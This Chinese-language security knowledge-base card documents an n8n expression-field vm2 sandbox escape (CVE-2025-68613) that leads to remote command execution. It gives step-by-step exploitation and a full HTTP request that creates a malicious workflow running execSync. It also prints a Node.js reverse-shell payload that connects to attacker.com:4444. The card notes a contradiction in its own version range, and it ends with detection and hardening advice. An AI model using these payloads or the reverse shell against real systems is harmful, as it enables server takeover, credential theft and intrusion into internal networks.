---
id: web-nodejs-n8n-expression-sandbox-escape-rce
title: n8n 表达式字段 vm2 沙箱逃逸：process.mainModule.require 执行系统命令（CVE-2025-68613）
type: scenario
domain: web
path: web/nodejs
technique: n8n-expression-vm2-sandbox-escape-process-mainmodule
tags:
- n8n
- nodejs
- vm2
- sandbox-escape
- expression-injection
- rce
- set-node
- cve-2025-68613
cve:
- CVE-2025-68613
severity: critical
confidence: high
status: verified
affected_versions: n8n 0.211.0 至 1.65.0（原文）；修复于 1.121.0
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V29
  verified_at: '2026-11-05T03:13:03+08:00'
  notes: 已通读原文并解码查看10张内嵌截图。核对：表达式 {{ }} 走旧 vm2、this.process.mainModule.require 逃逸、Code 节点 require is not defined 的差异、/rest/workflows 创建 Set 节点工作流；图8 poc_core.py 输出 uid=1000(node) gid=1000(node)，RCE 已证明。反弹 shell 用 Node net 模块与 Alpine 无 bash/nc 的说明一致。未验证点：PoC 未在本机执行；原文影响区间 0.211.0–1.65.0 与修复 1.121.0 矛盾，按原文保留。frontmatter 无 sources/source_url。
url: /docs/web/nodejs/web-nodejs-n8n-expression-sandbox-escape-rce/
draft: false
kb_aliases:
- CVE-2025-68613
- n8n 表达式注入 RCE
- n8n vm2 沙箱逃逸
- process.mainModule.require
- n8n Set 节点 RCE
---

## 一句话结论

n8n 的表达式字段（如 Set 节点 Value 的 `{{ ... }}`）在旧版 vm2 沙箱中执行，沙箱拦截了 `constructor.constructor` 却没有移除 `this.process.mainModule`；攻击者用 `this.process.mainModule.require("child_process")` 即可绕过沙箱，在 n8n 进程内以 `node` 用户执行任意系统命令。

## 原理

- n8n 工作流节点支持表达式：字段值写成 `{{ 表达式 }}`，运行时计算。表达式在 vm2 沙箱中执行，沙箱只暴露 `$json`、`$node` 等白名单对象，并拦截 `constructor.constructor`（Function 构造函数）以阻止动态代码生成。
- 但旧版 vm2 没有覆盖 `process.mainModule`：`this.process` 被暴露给表达式，而 `this.process.mainModule.require` 指向 Node 原生 `Module._load`，不在 vm2 拦截范围内。于是：
  ```js
  this.process.mainModule.require("child_process").execSync("id")
  ```
  可以加载内置模块并执行命令。
- n8n 内部存在两套沙箱：Code 节点使用较新的 vm2，`process.mainModule` 已被删除；表达式字段使用较旧的 vm2，`process.mainModule` 仍在。因此同一个 payload 在 Code 节点报 `require is not defined`，在 Set 节点表达式字段却能成功。
- 取得 admin 会话（或任何被允许创建工作流的账号）后，通过 `/rest/workflows` 创建含 Set 节点的工作流，Set 的 `value` 写成 `={{ (function(){...})() }}`，执行工作流即触发。
- 触发后命令在 n8n 容器内以运行用户执行（原文为 `uid=1000(node)`）。后续可读取数据库/第三方凭证、内网探测、用 Node.js `net` 模块建立反弹 shell（Alpine 容器无 bash/nc 和 `/dev/tcp`）。

## 触发条件

- n8n 版本在受影响范围（原文 0.211.0 至 1.65.0；修复于 1.121.0）。
- 攻击者拥有可创建工作流或编辑节点表达式的账号；常见路径是伪造 admin JWT 或已攻陷管理员账户。
- 目标使用表达式字段执行（默认启用沙箱，不需要关闭沙箱）。
- 工作流可被手动触发/执行（Manual Trigger，或通过 webhook 等触发）。

## 利用步骤

1. 取得 admin 会话（如通过 encryptionKey 伪造 JWT，见关联卡）。
2. 通过 `/rest/workflows` 创建一个工作流，包含 Manual Trigger 和 Set 节点。
3. Set 节点的 `value` 填入表达式 payload，执行 `id` 验证：
   ```text
   ={{ (function() { var require = this.process.mainModule.require; var cp = require("child_process"); return cp.execSync("id").toString(); })() }}
   ```
4. 执行工作流，观察返回结果或工作流执行记录，确认 `uid=1000(node)`。
5. 替换 `execSync` 中的命令进行后续操作：读凭证、内网探测、写文件、反弹 shell。
6. 若容器无 bash/nc 或 `/dev/tcp`，用 Node.js 原生 `net` 模块做 shell 管道。

## PoC

创建并执行恶意工作流：

```http
POST /rest/workflows HTTP/1.1
Host: target:5678
Content-Type: application/json
Cookie: n8n-auth=<admin token>

{
  "name": "RCE",
  "active": false,
  "nodes": [
    {"name": "Trigger", "type": "n8n-nodes-base.manualTrigger", "position": [0,0]},
    {
      "name": "RCE",
      "type": "n8n-nodes-base.set",
      "typeVersion": 2,
      "position": [300,0],
      "parameters": {
        "values": {
          "string": [{
            "name": "result",
            "value": "={{ (function() { var require = this.process.mainModule.require; var cp = require(\"child_process\"); return cp.execSync(\"id\").toString(); })() }}"
          }]
        }
      }
    }
  ],
  "connections": {"Trigger": {"main": [[{"node": "RCE", "type": "main", "index": 0}]]}},
  "settings": {}
}
```

执行结果：

```text
uid=1000(node) gid=1000(node)
```

反弹 shell 变体（Node.js `net` 模块，适配无 bash/nc 的 Alpine 容器）：

```js
{{ (function() {
  var net = require("net");
  var cp = require("child_process");
  var sh = cp.spawn("/bin/sh", []);
  var client = new net.Socket();
  client.connect(4444, "attacker.com", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
  return "shell sent";
})() }}
```

## 变体与关联

- 变体（模块加载）：除 `child_process` 外，可 `require("fs")` 读写文件、`require("http")` 内网探测、`require("net")` 建连。
- 变体（入口）：任何执行用户可控表达式且使用旧版 vm2 的字段/接口都可尝试同一逃逸；Code 节点使用新沙箱，`process.mainModule` 不可用。
- 变体（持久化）：执行后可创建工作流后门、修改现有工作流、读取第三方凭证。
- 关联：[[web-nodejs-n8n-encryptionkey-jwt-forgery-admin-takeover]]（取得 admin 会话的前置）。
- 关联：[[web-nodejs-n8n-form-content-type-confusion-file-read]]（完整链的无认证入口）。
- 关联：[[web-nodejs-n8n-workflow-import-injection-ssrf-backdoor]]（取得权限后的工作流注入与持久化）。
- 边界：新版本已升级沙箱（1.121.0 修复本 CVE），`process.mainModule` 被移除后该 payload 失效；不同 n8n 版本/沙箱初始化参数可能不同。

## 检测与防御

- 升级：n8n ≥ 1.121.0（修复 CVE-2025-68613）。
- 加固：工作流创建/编辑权限最小化，不把 admin 权限授予普通用户；对工作流 JSON 做表达式白名单/静态检查。
- 加固：表达式执行环境使用最新 vm2 或更严格的隔离（禁用 `process`、`require`、`global` 等），并定期更新依赖。
- 加固：以非 root 用户运行 n8n，限制容器出网（尤其到内网和云元数据），挂载最小化。
- 检测：工作流中出现 `process.mainModule`、`require("child_process")`、`execSync`、`spawn`、`net.Socket` 等表达式特征；`/rest/workflows` 的异常创建。
- 检测：n8n 进程派生 `sh`/`node` 子进程；容器内异常外连；工作流执行记录中出现命令输出或 `uid=` 等回显。
- 检测：Code 节点与表达式字段使用不同沙箱的差异可作为排查线索；审计工作流执行日志中的异常表达式。
